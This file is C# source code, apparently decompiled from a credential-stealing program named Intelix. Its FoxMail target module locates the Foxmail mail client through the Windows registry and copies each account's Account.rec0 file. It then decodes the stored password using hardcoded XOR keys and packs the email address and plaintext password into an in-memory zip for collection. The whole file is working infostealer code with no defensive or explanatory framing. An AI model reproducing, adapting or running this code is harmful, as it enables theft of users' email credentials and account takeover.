using System;
using System.IO;
using System.Text;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000041 RID: 65
	public class FoxMail : ITarget
	{
		// Token: 0x060000DA RID: 218 RVA: 0x0000C7BC File Offset: 0x0000A9BC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command");
			bool flag = registryKey == null;
			if (!flag)
			{
				string text = registryKey.GetValue("") as string;
				bool flag2 = string.IsNullOrEmpty(text);
				if (!flag2)
				{
					int num = text.LastIndexOf("Foxmail.exe", StringComparison.OrdinalIgnoreCase);
					bool flag3 = num < 0;
					if (!flag3)
					{
						string path = Path.Combine(text.Substring(0, num).Replace("\"", "").TrimEnd(new char[]
						{
							'\\',
							' '
						}), "Storage");
						bool flag4 = !Directory.Exists(path);
						if (!flag4)
						{
							Counter.CounterApplications counterApplications = new Counter.CounterApplications();
							counterApplications.Name = "FoxMail";
							string[] directories = Directory.GetDirectories(path, "*@*", SearchOption.TopDirectoryOnly);
							foreach (string text2 in directories)
							{
								string fileName = Path.GetFileName(text2);
								string text3 = Path.Combine(text2, "Accounts");
								bool flag5 = !Directory.Exists(text3);
								if (!flag5)
								{
									string text4 = Path.Combine(text3, "Account.rec0");
									bool flag6 = File.Exists(text4);
									if (flag6)
									{
										string text5 = Path.Combine(Path.GetTempPath(), string.Format("Account_{0:N}.rec", Guid.NewGuid()));
										File.Copy(text4, text5, true);
										bool flag7;
										int num2;
										string str = this.ParseSecretFileAndGetPassword(text5, out flag7, out num2);
										bool flag8 = flag7;
										if (flag8)
										{
											string text6 = "Foxmail\\" + fileName + "\\Account.txt";
											StringBuilder stringBuilder = new StringBuilder();
											stringBuilder.AppendLine("E-Mail: " + fileName);
											stringBuilder.AppendLine("Password: " + str);
											stringBuilder.AppendLine("FoxmailVersionDetected: " + ((num2 == 0) ? "6.x" : "7.x or later"));
											zip.AddTextFile(text6, stringBuilder.ToString());
											counterApplications.Files.Add(text4 + " => " + text6);
										}
										else
										{
											string text7 = "Foxmail\\" + fileName + "\\Account.rec0";
											zip.AddFile(text7, File.ReadAllBytes(text4));
											counterApplications.Files.Add(text4 + " => " + text7);
										}
										File.Delete(text5);
									}
								}
							}
							bool flag9 = counterApplications.Files.Count > 0;
							if (flag9)
							{
								counter.Applications.Add(counterApplications);
							}
						}
					}
				}
			}
		}

		// Token: 0x060000DB RID: 219 RVA: 0x0000CA50 File Offset: 0x0000AC50
		private string ParseSecretFileAndGetPassword(string path, out bool found, out int ver)
		{
			found = false;
			ver = 1;
			byte[] array = File.ReadAllBytes(path);
			bool flag = array == null || array.Length == 0;
			string empty;
			if (flag)
			{
				empty = string.Empty;
			}
			else
			{
				bool flag2 = array[0] == 208;
				if (flag2)
				{
					ver = 0;
				}
				else
				{
					ver = 1;
				}
				string text = "";
				string value = "";
				for (int i = 0; i < array.Length; i++)
				{
					byte b = array[i];
					bool flag3 = b > 32 && b < 127 && b != 61;
					if (flag3)
					{
						string str = text;
						char c = (char)b;
						text = str + c.ToString();
						bool flag4 = text.Equals("Account", StringComparison.Ordinal);
						if (flag4)
						{
							value = this.ReadAsciiValue(array, ref i, ver);
							text = "";
						}
						else
						{
							bool flag5 = text.Equals("POP3Account", StringComparison.Ordinal);
							if (flag5)
							{
								value = this.ReadAsciiValue(array, ref i, ver);
								text = "";
							}
							else
							{
								bool flag6 = (text.Equals("Password", StringComparison.Ordinal) || text.Equals("POP3Password", StringComparison.Ordinal)) && !string.IsNullOrEmpty(value);
								if (flag6)
								{
									string strHash = this.ReadAsciiValue(array, ref i, ver);
									string result = this.DecodePW(ver, strHash);
									found = true;
									return result;
								}
							}
						}
					}
					else
					{
						text = "";
					}
				}
				empty = string.Empty;
			}
			return empty;
		}

		// Token: 0x060000DC RID: 220 RVA: 0x0000CBC4 File Offset: 0x0000ADC4
		private string ReadAsciiValue(byte[] bits, ref int jx, int ver)
		{
			int num = jx + 9;
			bool flag = ver == 0;
			if (flag)
			{
				num = jx + 2;
			}
			StringBuilder stringBuilder = new StringBuilder();
			while (num < bits.Length && bits[num] > 32 && bits[num] < 127)
			{
				stringBuilder.Append((char)bits[num]);
				num++;
			}
			jx = num;
			return stringBuilder.ToString();
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000CC2C File Offset: 0x0000AE2C
		private string DecodePW(int ver, string strHash)
		{
			string text = string.Empty;
			bool flag = ver == 0;
			int[] array;
			int num;
			if (flag)
			{
				array = new int[]
				{
					126,
					100,
					114,
					97,
					71,
					111,
					110,
					126
				};
				num = Convert.ToInt32("5A", 16);
			}
			else
			{
				array = new int[]
				{
					126,
					70,
					64,
					55,
					37,
					109,
					36,
					126
				};
				num = Convert.ToInt32("71", 16);
			}
			int num2 = strHash.Length / 2;
			int num3 = 0;
			int[] array2 = new int[num2];
			for (int i = 0; i < num2; i++)
			{
				array2[i] = Convert.ToInt32(strHash.Substring(num3, 2), 16);
				num3 += 2;
			}
			int[] array3 = new int[array2.Length];
			array3[0] = (array2[0] ^ num);
			bool flag2 = array2.Length > 1;
			if (flag2)
			{
				Array.Copy(array2, 1, array3, 1, array2.Length - 1);
			}
			while (array2.Length > array.Length)
			{
				int[] array4 = new int[array.Length * 2];
				Array.Copy(array, 0, array4, 0, array.Length);
				Array.Copy(array, 0, array4, array.Length, array.Length);
				array = array4;
			}
			int[] array5 = new int[array2.Length];
			for (int j = 1; j < array2.Length; j++)
			{
				array5[j - 1] = (array2[j] ^ array[j - 1]);
			}
			int[] array6 = new int[array5.Length];
			for (int k = 0; k < array5.Length - 1; k++)
			{
				bool flag3 = array5[k] - array3[k] < 0;
				if (flag3)
				{
					array6[k] = array5[k] + 255 - array3[k];
				}
				else
				{
					array6[k] = array5[k] - array3[k];
				}
				text += ((char)array6[k]).ToString();
			}
			return text;
		}
	}
}
